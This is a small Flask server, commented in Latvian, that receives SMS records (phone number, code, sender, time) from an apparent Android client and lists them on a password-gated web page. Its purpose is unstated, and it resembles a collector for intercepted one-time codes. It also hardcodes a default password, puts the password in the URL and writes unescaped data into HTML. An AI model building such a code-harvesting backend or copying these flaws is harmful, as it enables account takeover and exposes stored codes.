import os
from flask import Flask, request, jsonify, abort
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
from urllib.parse import urlparse

app = Flask(__name__)

# PostgreSQL datubāzes URL no Render vides mainīgā
DATABASE_URL = os.environ.get("DATABASE_URL")
if not DATABASE_URL:
    raise RuntimeError("Lūdzu, iestatiet DATABASE_URL vides mainīgo ar PostgreSQL URL.")

# Konvertē DATABASE_URL Render formātu uz SQLAlchemy formātu
# Render dod URL, kas sākas ar 'postgres://', bet SQLAlchemy prasa 'postgresql://'
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Vienkārša parole piekļuvei
ACCESS_PASSWORD = os.environ.get("ACCESS_PASSWORD", "mana-parole")

class SmsLog(db.Model):
    __tablename__ = "sms_logs"
    id = db.Column(db.Integer, primary_key=True)
    phone = db.Column(db.String(50))
    code = db.Column(db.String(20))
    sender = db.Column(db.String(100))
    timestamp = db.Column(db.DateTime)
    received_at = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f"<SmsLog {self.phone} {self.code} {self.sender} {self.timestamp}>"

@app.before_first_request
def create_tables():
    db.create_all()

@app.route("/send", methods=["POST"])
def receive_sms():
    try:
        data = request.get_json(force=True)
        phone = data.get("phone")
        code = data.get("code")
        sender = data.get("sender")
        ts = data.get("timestamp")

        if not all([phone, code, sender, ts]):
            return jsonify({"error": "Trūkst obligātu datu"}), 400

        # timestamp no android ir ms kopš epoch, pārvēršam sekundēs
        dt = datetime.utcfromtimestamp(ts / 1000)

        log = SmsLog(phone=phone, code=code, sender=sender, timestamp=dt)
        db.session.add(log)
        db.session.commit()

        print(f"Saņemts SMS: {log}")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print("Kļūda POST /send:", e)
        return jsonify({"error": str(e)}), 400

@app.route("/logs", methods=["GET"])
def show_logs():
    password = request.args.get("password", "")
    if password != ACCESS_PASSWORD:
        abort(403, description="Nepareiza parole")

    logs = SmsLog.query.order_by(SmsLog.received_at.desc()).all()

    html = "<h1>Saņemtie SMS dati</h1>"
    html += "<table border='1' cellpadding='5' cellspacing='0'>"
    html += "<tr><th>ID</th><th>Tālrunis</th><th>Kods</th><th>Sūtītājs</th><th>SMS laiks</th><th>Saņemts serverī</th></tr>"
    for log in logs:
        html += f"<tr><td>{log.id}</td><td>{log.phone}</td><td>{log.code}</td><td>{log.sender}</td><td>{log.timestamp}</td><td>{log.received_at}</td></tr>"
    html += "</table>"

    return html

@app.route("/")
def home():
    return "Serveris darbojas. Lieto POST /send un GET /logs?password=xxx"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
